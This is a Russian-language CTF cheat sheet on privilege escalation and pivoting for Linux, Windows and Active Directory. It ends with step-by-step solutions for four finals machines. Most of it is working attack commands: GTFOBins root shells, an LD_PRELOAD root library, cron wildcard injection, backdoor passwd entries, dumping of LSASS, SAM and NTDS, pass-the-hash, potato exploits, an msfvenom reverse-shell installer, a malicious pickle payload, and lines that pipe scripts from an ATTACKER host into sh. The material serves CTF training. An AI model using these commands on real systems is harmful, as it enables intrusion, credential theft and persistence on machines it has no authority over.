# Privilege Escalation — Linux, Windows, pivoting, цепочки 2025

> X Кубок CTF России 2026, секретный финал: multi-machine pentest, 4 машины, user/root флаги.
> Правило: сначала перечисление, потом эксплойт. Фиксируй: команда → вывод → гипотеза.

## 0. Рамка
1. Стабильный доступ: reverse shell, SSH, RDP, WinRM; сразу `id`/`whoami`, хост, сеть.
2. Базовая картина: ОС, ядро, пользователи, сервисы, порты, монтирования, задачи.
3. Простые пути: `sudo -l`, SUID, capabilities, cron, ACL, пароли в файлах.
4. Ядро/драйверы/0day — в последнюю очередь: можно уронить машину.
5. Флаг отправляй сразу; локальный root без флага — не результат.

## 1. Linux: перечисление за 60 секунд
```bash
id; sudo -l; uname -a; cat /etc/os-release; hostname; ip a; ss -lntup
ps auxf; systemctl list-units --type=service --state=running
find / -perm -4000 -type f 2>/dev/null; find / -perm -2000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*; crontab -l; systemctl list-timers --all
find / -writable -type d 2>/dev/null | head -50
mount; cat /etc/fstab; df -h
env; cat ~/.bash_history; ls -la /home/*/.ssh 2>/dev/null
```
### 1.1. linpeas и pspy
```bash
# атакующий
python3 -m http.server 8000
# цель
wget http://ATTACKER:8000/linpeas.sh -O /tmp/lp.sh; chmod +x /tmp/lp.sh; /tmp/lp.sh -a
curl -s http://ATTACKER:8000/linpeas.sh | sh
# без curl/wget
nc -lvnp 8000 < linpeas.sh          # атакующий
cat < /dev/tcp/ATTACKER/8000 | sh   # цель
```
`pspy` — процессы без root: `./pspy64 -pf -i 1000`. Смотри, кто запускает скрипты от root, команды без полного пути, доступные файлы.

## 2. Linux: векторы
### 2.1. sudo
```bash
sudo -l; sudo -V
sudo -u#-1 id          # CVE-2019-14287, старый sudo
sudo vim -c ':!/bin/sh'
sudo find / -exec /bin/sh \; -quit
sudo awk 'BEGIN{system("/bin/sh")}'
sudo less /etc/passwd     # затем !sh
sudo nmap --interactive   # затем !sh
sudo env /bin/sh
sudo python3 -c 'import os; os.system("/bin/sh")'
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo git -p help          # затем !/bin/sh
sudo man man              # затем !sh
```
- `env_keep+=LD_PRELOAD` → подмена библиотеки; `LD_LIBRARY_PATH`, `PYTHONPATH`, `PERL5LIB` аналогично.
- `sudoedit`/`sudo -e` — CVE-2021-3156 (Baron Samedit).
- NOPASSWD на `systemctl`, `journalctl`, `docker`, `apt`, `pip` — почти всегда root.
```bash
cat > /tmp/x.c <<'EOF'
#include <unistd.h>
__attribute__((constructor)) void x(){ setuid(0); setgid(0); system("/bin/sh"); }
EOF
gcc -fPIC -shared -o /tmp/x.so /tmp/x.c
sudo LD_PRELOAD=/tmp/x.so /usr/bin/any_sudo_binary
```

### 2.2. SUID/SGID
```bash
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
find / -perm -2000 -type f -exec ls -la {} \; 2>/dev/null
/usr/bin/bash -p
/usr/bin/cp /bin/sh /tmp/sh; chmod +s /tmp/sh; /tmp/sh -p
/usr/bin/find . -exec /bin/sh -p \; -quit
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
/usr/bin/perl -e 'use POSIX; setuid(0); exec "/bin/sh";'
/usr/bin/php -r 'posix_setuid(0); system("/bin/sh");'
/usr/bin/env /bin/sh -p
/usr/bin/tee -a /etc/passwd
```
**SUID `time`.** Если `time` SUID и принадлежит другому пользователю, команда идёт с его euid:
```bash
ls -l /usr/local/bin/time
/usr/local/bin/time -p /bin/bash -p
```
Проверь `id`: shell мог сбросить привилегии — тогда `bash -p`/`sh -p`.
**Кастомный SUID:** `strings`, `ltrace -f`, `strace -f`, Ghidra; ищи `system`, `execve`, `popen`, относительные пути, порядок `setuid`/`seteuid`, переполнения.

### 2.3. Capabilities
```bash
getcap -r / 2>/dev/null; capsh --print
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'   # cap_setuid
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```
`cap_dac_read_search` — читать `/etc/shadow`, ключи, бэкапы; `cap_dac_override` — писать в `/etc/passwd`, sudoers; `cap_sys_admin` — mount/container escape; `cap_net_raw` — sniff; `cap_setfcap` — выдать caps; `cap_sys_ptrace` — инъекция в root-процесс.

### 2.4. Cron
```bash
cat /etc/crontab; ls -la /etc/cron.*; crontab -l; ./pspy64 -pf -i 1000
```
- Writable-скрипт от root → `cp /bin/sh /tmp/sh; chmod +s /tmp/sh`.
- Команда без пути → PATH hijack.
- Wildcard injection в `tar`:
```bash
cd /writable/dir
echo 'cp /bin/sh /tmp/sh; chmod +s /tmp/sh' > pwn.sh
touch -- --checkpoint=1
touch -- --checkpoint-action=exec=sh\ pwn.sh
# root cron: tar czf /tmp/backup.tar *
```
- `rsync` wildcard: `-e 'sh pwn.sh'`; `run-parts` игнорирует имена с точками; проверь `cron.d`, `cron.daily`, `cron.hourly`, пользовательские crontab.

### 2.5. Systemd
```bash
systemctl list-timers --all; systemctl cat service_name
find /etc/systemd/system /lib/systemd/system -writable -type f 2>/dev/null
```
- Writable unit → `ExecStart=/bin/sh -c 'chmod +s /bin/bash'`, затем `systemctl daemon-reload; systemctl restart service`.
- Writable `EnvironmentFile` → подмена переменных; `ExecStartPre` без пути → PATH hijack.
- `systemd-run --unit=x /bin/sh` при наличии polkit; `journalctl` с pager → `!sh`.

### 2.6. PATH hijack
```bash
echo $PATH; find / -type d -writable 2>/dev/null
echo -e '#!/bin/sh\ncp /bin/sh /tmp/sh; chmod +s /tmp/sh' > /tmp/backup
chmod +x /tmp/backup; export PATH=/tmp:$PATH
```
SUID может очищать PATH — проверяй `env -i`; ищи относительные вызовы в systemd, cron, CGI, бэкапах.

### 2.7. NFS, Docker, LXD
```bash
showmount -e IP
mount -t nfs IP:/share /tmp/mnt
# no_root_squash:
cp /bin/bash /tmp/mnt/bash; chmod +s /tmp/mnt/bash; /tmp/mnt/bash -p
id; groups; ls -l /var/run/docker.sock
docker run --rm -it -v /:/mnt alpine chroot /mnt sh
docker run --rm -it --privileged -v /:/mnt alpine sh
```
Writable `docker.sock` или группа `docker` = root; группа `lxd`/`lxc` → привилегированный контейнер с монтированием `/`; `insecure`, `no_all_squash` тоже интересны.

### 2.8. Ядро
```bash
uname -a; cat /proc/version
searchsploit linux kernel $(uname -r); ./linux-exploit-suggester.sh
```
Кандидаты: Dirty Pipe (CVE-2022-0847), PwnKit (CVE-2021-4034), Baron Samedit (CVE-2021-3156), overlayfs (CVE-2021-3493), nf_tables (CVE-2023-32233), Dirty COW. Компилируй под цель (`gcc -static`, arch/libc), проверь `CONFIG_*` и sysctl. Эксплойт может повесить машину — сначала сохрани лут.

### 2.9. passwd, shadow, sudoers, SSH
```bash
ls -l /etc/passwd /etc/shadow /etc/sudoers /etc/sudoers.d
openssl passwd -1 -salt x pass
echo 'root2:$1$x$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd; su root2
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
ls -la /home/*/.ssh; cat /home/*/.ssh/authorized_keys 2>/dev/null
echo $SSH_AUTH_SOCK; ssh-add -l
```
Writable shadow → замени хеш root; `sudoers.d/*` → `user ALL=(ALL) NOPASSWD:ALL`; `authorized_keys` → добавь свой ключ (в рамках задания); агент-форвардинг → используй сокет.

### 2.10. Сокеты, БД, конфиги
```bash
ss -lntup; ss -xlp; find / -type s 2>/dev/null
redis-cli; CONFIG SET dir /var/spool/cron; CONFIG SET dbfilename root
mysql -u root -p'' -e 'SELECT ... INTO OUTFILE "/var/www/x.php"'
grep -RIn "password\|secret\|token\|api_key" /var/www /opt /srv /home 2>/dev/null
cat ~/.bash_history; cat ~/.git-credentials; find / -name "*.env" -o -name "wp-config.php" 2>/dev/null
```
- `/var/run/docker.sock`, MySQL/Postgres unix-socket, Redis без пароля.
- `.git` → `git log -p`, `git show`; cloud creds (`~/.aws`, `~/.azure`, `~/.config/gcloud`).
- `pickle`/`yaml.load`/`eval` в root-сервисе → RCE (machine-3).

## 3. Windows: перечисление
```cmd
whoami /all
whoami /priv
systeminfo
hostname
net user
net localgroup administrators
net group "Domain Admins" /domain
cmdkey /list
ipconfig /all
route print
netstat -ano
tasklist /svc
wmic service get name,displayname,pathname,startmode
schtasks /query /fo LIST /v
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
```powershell
Get-LocalUser; Get-LocalGroupMember Administrators
Get-Service | ? {$_.Status -eq 'Running'}
Get-ScheduledTask
Get-CimInstance Win32_Service | select Name,PathName,StartMode
```
### 3.1. winpeas, PowerUp, BloodHound
```cmd
winpeasx64.exe quiet cmd fast
winpeas.bat
```
```powershell
. .\PowerUp.ps1; Invoke-AllChecks
Get-ModifiableService; Get-UnquotedService; Get-ModifiablePath
```
```cmd
SharpHound.exe -c All --zipfilename loot.zip
```
```bash
bloodhound-python -u user -p pass -d DOMAIN -dc DC -c All
```
Запросы: shortest path to Domain Admins, kerberoastable, AS-REP roastable, unconstrained delegation, ACL edges.

### 3.2. ACL и слабые права
```cmd
icacls C:\path
accesschk.exe -accepteula -uwcqv "Users" *
accesschk.exe -accepteula -uwcqv "Everyone" *
sc sdshow service
```
`GenericAll`/`GenericWrite`/`WriteDACL`/`WriteOwner` на пользователя → смена пароля/группа; на сервис → `sc config svc binpath= C:\temp\shell.exe`; на компьютер → RBCD/Shadow Credentials. `PowerView`: `Add-DomainGroupMember`, `Set-DomainUserPassword`.

### 3.3. Службы: unquoted path и права
```cmd
wmic service get name,displayname,pathname,startmode | findstr /i "auto"
sc qc service
icacls "C:\Program Files\My App"
accesschk.exe -uwcqv "Users" service
```
- Путь `C:\Program Files\My App\svc.exe` без кавычек и writable `C:\`/`C:\Program Files\` → `C:\Program.exe` или `C:\Program Files\My.exe`, перезапуск.
- Writable binary → замена; writable directory → DLL hijack; `SERVICE_CHANGE_CONFIG` → `sc config service binpath= "cmd /c ..."`.

### 3.4. SeImpersonate / SeAssignPrimaryToken
```cmd
whoami /priv | findstr /i "Impersonate AssignPrimaryToken"
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "cmd /c whoami"
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}
SweetPotato.exe -p cmd.exe
RoguePotato.exe -r 10.0.0.1 -e "cmd.exe"
```
PrintSpoofer — 2016/2019, GodPotato — .NET 4, JuicyPotato — старые сборки. Нужен аккаунт с правом impersonate (часто IIS/MSSQL).

### 3.5. SeBackup / SeRestore
```cmd
whoami /priv | findstr /i "Backup Restore"
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
robocopy /b C:\Windows\NTDS C:\temp NTDS.dit
diskshadow /s script.txt
```
`SeBackupPrivilege` читает в обход ACL, `SeRestore` пишет. Экспорт: `secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL`.
```text
set context persistent nowriters
add volume C: alias v
create
expose %v% Z:
```
Затем копируй `Z:\Windows\NTDS\NTDS.dit`.

### 3.6. AlwaysInstallElevated, задачи, autorun
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
schtasks /query /fo LIST /v
schtasks /query /tn "TaskName" /xml
icacls C:\Path\task.exe
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SYSTEM\CurrentControlSet\Services
```
Оба `AlwaysInstallElevated=1`:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f msi -o x.msi
```
```cmd
msiexec /quiet /qn /i C:\temp\x.msi
```
Writable task binary/definition → подмена/`schtasks /change`; задача от SYSTEM = root; writable Run-key/`ImagePath` → подмена при логине/перезагрузке.

### 3.7. Credentials: SAM, LSASS, NTDS
```cmd
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
procdump64.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <PID> C:\temp\lsass.dmp full
ntdsutil "ac i ntds" "ifm" "create full C:\temp" q q
vssadmin create shadow /for=C:
findstr /S /I cpassword \\DC\SYSVOL\*.xml
cmdkey /list
vaultcmd /listcreds:"Windows Credentials"
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```
```bash
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" exit
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```
- GPP `cpassword` → `gpp-decrypt`; `unattend.xml`, `sysprep.inf`, `web.config`.
- Браузеры: `LaZagne.exe all`, `SharpChrome`; DPAPI: `mimikatz dpapi::masterkey`, `SharpDPAPI`.

### 3.8. Pass-the-Hash, WinRM, RDP
```bash
impacket-psexec -hashes :NTHASH DOMAIN/user@IP
impacket-wmiexec -hashes :NTHASH DOMAIN/user@IP
impacket-smbexec -hashes :NTHASH DOMAIN/user@IP
impacket-atexec -hashes :NTHASH DOMAIN/user@IP "whoami"
evil-winrm -i IP -u Administrator -H NTHASH
netexec smb IP -u Administrator -H NTHASH -x whoami
xfreerdp /v:IP /u:Administrator /pth:NTHASH /cert:ignore
```
- Формат `LMHASH:NTHASH`; локальный админ — `:NTHASH`; Overpass-the-hash: `mimikatz "sekurlsa::pth /user:u /domain:d /ntlm:HASH /run:cmd.exe"`.
- RDP с PTH требует Restricted Admin/`DisableRestrictedAdmin=0`.
- WinRM 5985/5986, RDP 3389; проверь firewall и `Remote Management Users`.

### 3.9. Домен быстро
- Kerberoasting: `GetUserSPNs.py domain/user:pass -dc-ip DC -request`.
- AS-REP: `GetNPUsers.py domain/ -usersfile users.txt -dc-ip DC -no-pass`.
- DCSync: `secretsdump.py domain/user:pass@DC -just-dc`.
- ACL-пути — BloodHound; ADCS — `Certipy find`, ESC1/ESC8; GPO/OU ACL, trusts, unconstrained delegation.

## 4. Pivoting
### 4.1. chisel
```bash
./chisel server -p 8000 --reverse              # атакующий
./chisel client ATTACKER:8000 R:socks          # цель; SOCKS5 127.0.0.1:1080
./chisel client ATTACKER:8000 8080:127.0.0.1:80
./chisel client ATTACKER:8000 R:3389:127.0.0.1:3389
```
### 4.2. ligolo-ng
```bash
sudo ip tuntap add dev ligolo mode tun; sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
./agent -connect ATTACKER:11601 -ignore-cert
session; ifconfig; start
sudo ip route add 10.10.10.0/24 dev ligolo
```
L3-доступ удобнее SOCKS для сканов и RDP; проверь `ip route`, `ping`, `nmap -Pn`.
### 4.3. SSH
```bash
ssh -D 1080 user@host                 # SOCKS5
ssh -L 8080:internal:80 user@host     # local forward
ssh -R 4444:127.0.0.1:4444 user@host  # remote forward
ssh -J jump user@target
ssh -o ProxyCommand='ssh -W %h:%p jump' user@target
ssh -N -f -D 1080 user@host
```
`-R` требует `GatewayPorts` для внешнего доступа; ключи/агент: `ssh -A`, `SSH_AUTH_SOCK`.
### 4.4. proxychains, socat, portproxy
```ini
[ProxyList]
socks5 127.0.0.1 1080
```
```bash
proxychains4 -q nmap -sT -Pn -p 22,80,445 10.10.10.5
proxychains4 -q evil-winrm -i 10.10.10.5 -u user -p pass
socat TCP-LISTEN:8080,fork,reuseaddr TCP:internal:80
socat TCP-LISTEN:4444,fork,reuseaddr TCP:127.0.0.1:4444
sshuttle -r user@host 10.0.0.0/8
```
```cmd
netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=10.0.0.5
netsh interface portproxy show all
```
SOCKS не умеет ICMP → `nmap -sT -Pn`, не `-sS`; включи `proxy_dns`, иначе утечка DNS. Metasploit: `autoroute add 10.10.10.0/24`, `portfwd add -l 8080 -p 80 -r 10.0.0.5`.

## 5. Post-exploitation
### 5.1. Флаги
Linux: `/root/flag`, `/root/flag.txt`, `/home/*/flag`, `/flag`, `/opt/flag`, `/srv/flag`, `env | grep -i flag`.
Windows: `C:\flag.txt`, `C:\Users\*\Desktop\flag.txt`, `C:\ProgramData`, реестр, `Get-ChildItem -Recurse -Filter *flag*`.
### 5.2. Loot
- `/etc/passwd`, `/etc/shadow`, sudoers, SSH-ключи, `authorized_keys`, `known_hosts`.
- История shell, `.git`, `.env`, конфиги БД, cloud creds, CI/CD-токены.
- Windows: SAM/SYSTEM/SECURITY, NTDS.dit, `ConsoleHost_history.txt`, `cmdkey`, DPAPI, браузеры.
- Сеть: `ip a`, `route`, `arp -a`, `netstat`, `ss`, DNS, VPN-конфиги.
### 5.3. Persistence и cleanup (в рамках задания)
- Linux: cron, systemd unit/timer, `authorized_keys`, SUID, пользователь в sudoers.
- Windows: scheduled task, service, Run-key, новый пользователь, OpenSSH `authorized_keys`.
- Не меняй чужие сервисы, не ломай checker, не удаляй данные; сохрани оригиналы и восстанови.
```bash
rm -f /tmp/lp.sh /tmp/x.so /tmp/sh /tmp/pwn.sh
crontab -e; systemctl disable --now my.service; rm /etc/systemd/system/my.service
```
```cmd
schtasks /delete /tn "MyTask" /f
sc delete MyService
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyKey /f
```
Удали инструменты, дампы, созданных пользователей; не чисти логи «на всякий случай».

## 6. Цепочки суперфинала 2025
### 6.1. machine-1: Telegram webhook → Bot API file:// → SSH → vim cap_setuid
Порты 22, 80, 8080 (webhook), 8081 (локальный Bot API).
1. Web-страница: `ADMIN_ID=6698983417`, `Webhook set to http://0.0.0.0:8080/webhook`; в HTML-комментарии — `/promote`, `/get_remote_pass`.
2. Webhook не проверяет `secret_token` → поддельный update от админа:
```bash
python3 get_user_password.py IP <YOUR_TELEGRAM_ID>
# POST /webhook: from.id=6698983417, text="/promote <id>"
```
3. Админ-роль и пароль через `/get_remote_pass`; username SSH — из `/etc/passwd`.
4. Локальный `telegram-bot-api` на 8081 позволяет `file://`:
```bash
curl -X POST "http://IP:8081/bot<TOKEN>/sendDocument" -H 'Content-Type: application/json' \
  -d '{"chat_id":<CHAT_ID>,"document":"file:///etc/passwd"}'
```
5. SSH низким пользователем; `linpeas` без curl/wget:
```bash
nc -lvnp 80 < linpeas.sh        # атакующий
cat < /dev/tcp/ATTACKER/80 | sh # цель
```
6. `/usr/bin/vim.nox cap_setuid=ep`:
```bash
vim.nox -c ':py3 import os; os.setuid(0); os.execl("/bin/sh","sh","-c","reset; exec sh")'
```
7. Root-флаг. Урок: не выставляй локальный Bot API наружу; webhook без секрета = подделка админа.

### 6.2. machine-2: Sectrans TOCTOU/UAF → HWMonitor.sys → MEMORY.DMP → PTH
Порты 9876 (SecTrans), 22 (SSH). Два бага в user-сервисе:
1. **TOCTOU:** два соединения делят `UserSession`, `current_filepath` общий. Первое проходит проверку на `test.txt`, второе подменяет путь на `../../../sensitive.txt`; первое читает подменённый файл.
2. **UAF ключа:** `SWITCH` вызывает `crypto_context_free()`, `HeapFree(ctx->key)` без обнуления; `INFO` делает `HeapAlloc(32)`/`HeapFree`, следующий `GET` использует dangling key, содержимое контролируем (имя файла).
3. Читаем `ConsoleHost_history.txt` → пароль SSH.
4. На Windows: `Get-Service HWMonitor`; драйвер `C:\Windows\Drivers\HWMonitor.sys`; IOCTL `IOCTL_CALIBRATE_SENSORS` с `SensorCount > 64` → OOB.
5. Краш → BSOD; `HKLM\SYSTEM\CurrentControlSet\Control\CrashControl`: `DumpFile=C:\Windows\MEMORY.DMP`, `AlwaysKeepMemoryDump=1`.
6. После перезагрузки — дамп и Volatility:
```bash
vol.py -f MEMORY.DMP windows.hashdump.Hashdump
```
7. NT hash админа → PTH:
```bash
impacket-psexec -hashes :NTHASH Administrator@IP
```
Урок: гонки/UAF в user-сервисе дают user; root — через драйвер и дамп памяти.

### 6.3. machine-3: LFI → sip.conf → Asterisk overflow → SUID time → pickle
1. HR-портал на 8080, LFI с двойным URL-кодированием:
```bash
curl -b cookie "http://IP:8080/api/files/VOIP/%252e%252e%252fVOIP/sip.conf"
curl -b cookie "http://IP:8080/api/files/VOIP/%252e%252e%252fVOIP/search_engine"
```
2. `sip.conf`: Asterisk на 5065, `[1000] secret=myturmisthebest`, `context=incoming`; SIP-клиент, IVR рекламирует «поисковый движок».
3. В `search_engine` после `v5[64]` — `command[64]`, уходящая в `system`. 64 токена через `*`, payload; `#` завершает ввод; reverse shell `ncat -c sh ATTACKER 6671`.
4. RCE как `asterisk`; `find / -perm -4000` → `/usr/local/bin/time` SUID, владелец `t.belov`:
```bash
/usr/local/bin/time -p /bin/bash -p
```
5. `sudo -l`: разрешён `/home/t.belov/system_monitor`; читает `/tmp/6DF58AF8-E675-4466-85FC-595333EDAC4B.cfg` и делает `pickle.loads` (base64):
```python
import pickle, os, base64
class P:
    def __reduce__(self):
        return (os.system, ("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash",))
print(base64.b64encode(pickle.dumps(P())).decode())
```
6. Записываем cfg, `sudo system_monitor`, root + кусок ключа к machine-4.
Урок: LFI → VOIP-конфиг → overflow → SUID time → sudo + pickle: четыре класса уязвимостей.

### 6.4. machine-4: crypto/PPC/OSINT → Turing machine → su flaguser → SUID update_validator
1. `cyber_machine.zip`, `pass.txt`. Цепочка: base64 → ROT13(10) → reverse → Vigenère (TRUMAN) → XOR с `A` + hex → MD5 по 5 hex → brute 5-digit hex → base64. Пароль архива: `M4Y837H3R341F1495ARE7HEFR1END5Y0UMAD3ALL4L0N9??`.
2. Внутри `turing`, `states.txt`: эмулятор машины Тьюринга с кейгеном. Реверс от конечного состояния `481`, выход `URF5FCWFYJZ2Y55X9LGCXH`, 154 шага; из-за перекоса `R/L/N` идём с конца. Пароль: `N077H47C0M6L1C473DHUHH`.
3. `su flaguser` → user-флаг и SUID `update_validator`, работающий с `/opt/updates`.
4. Symlink `/opt/updates/0 -> /root/flag`, файлы `0..127`, `ulimit -n 128`, запуск валидатора. Истощение fd + переиспользование дескрипторов → чтение `/root/flag` и перезапись `/root/updateKey`; 16-байтовый секрет — пароль root.
5. `su root` → root-флаг.
Урок: финал может начинаться с OSINT/PPC, а не с shell; читай `pass.txt`.

## 7. Чек-листы
### 7.1. Linux, 15 минут
- [ ] 0–2: `id`, `sudo -l`, `uname -a`, `hostname`, `ip a`, `ss -lntup`.
- [ ] 2–5: SUID, SGID, capabilities, `sudo -V`.
- [ ] 5–8: cron, timers, systemd, writable-скрипты, `pspy`.
- [ ] 8–10: docker.sock, NFS, сокеты, БД, `/var/backups`, `/opt`, `/srv`.
- [ ] 10–12: home, history, SSH-ключи, конфиги, `.env`, `.git`.
- [ ] 12–14: linpeas, kernel-эксплойты.
- [ ] 14–15: выбери один вектор, проверь, зафиксируй.
### 7.2. Windows, 15 минут
- [ ] 0–2: `whoami /all`, `whoami /priv`, `systeminfo`, `hostname`.
- [ ] 2–4: `net user`, `net localgroup administrators`, `cmdkey /list`.
- [ ] 4–6: службы, `wmic service`, unquoted path, `icacls`, `accesschk`.
- [ ] 6–8: scheduled tasks, Run-keys, writable binaries.
- [ ] 8–10: SeImpersonate/SeBackup/AlwaysInstallElevated.
- [ ] 10–12: SAM/LSASS/NTDS, history, GPP, unattend, browser.
- [ ] 12–14: winpeas, PowerUp, BloodHound.
- [ ] 14–15: PTH/RDP/WinRM, флаг, фиксация доступа.

## 8. Типовые ошибки
1. Не сделал `sudo -l` первым — половина Linux-машин решается там.
2. SUID-shell сбрасывает euid — `bash -p`/`sh -p`, проверь `id`.
3. Забыл SGID/capabilities — `find -perm -2000`, `getcap -r /`.
4. Не читает кастомный SUID — `strings`, `ltrace`, `strace`, Ghidra.
5. Cron без pspy — задача может срабатывать раз в минуту.
6. NFS без `no_root_squash` — `showmount -e`, монтирование, SUID.
7. Docker.sock — writable сокет = root; смотри `groups`.
8. Kernel exploit без бэкапа — машина падает, теряешь флаги.
9. Windows `whoami` без `/priv` — не видно SeImpersonate/SeBackup.
10. AlwaysInstallElevated проверен в одной ветке — нужны HKCU и HKLM.
11. LSASS без прав/AV — `comsvcs.dll`, procdump, Task Manager; проверь Defender.
12. PTH с неверным форматом — `LMHASH:NTHASH`, локальный админ `:NTHASH`.
13. RDP с NLA — Restricted Admin или отключить NLA.
14. Firewall/clock skew — WinRM/RDP закрыты, Kerberos чувствителен ко времени.
15. Не убрал за собой — чужие сервисы, crontab, пользователи.
16. Не проверил формат флага — регистр, `ctfcup{}`, `_`/`-`, пробелы.

## 9. Мини-справочник
| Что | Команда |
|---|---|
| sudo | `sudo -l`, GTFOBins |
| SUID/SGID | `find / -perm -4000 -type f 2>/dev/null` |
| caps | `getcap -r / 2>/dev/null` |
| cron | `cat /etc/crontab; ls -la /etc/cron.*` |
| systemd | `systemctl list-timers --all; systemctl cat` |
| процессы | `pspy64 -pf -i 1000` |
| сеть | `ss -lntup; ss -xlp` |
| docker | `ls -l /var/run/docker.sock; docker ps` |
| NFS | `showmount -e IP` |
| Windows privs | `whoami /priv` |
| Windows ACL | `icacls`, `accesschk` |
| Windows creds | `reg save`, `procdump`, `ntdsutil` |
| PTH | `impacket-psexec -hashes :HASH` |
| pivot | `chisel`, `ligolo-ng`, `ssh -D`, `proxychains` |
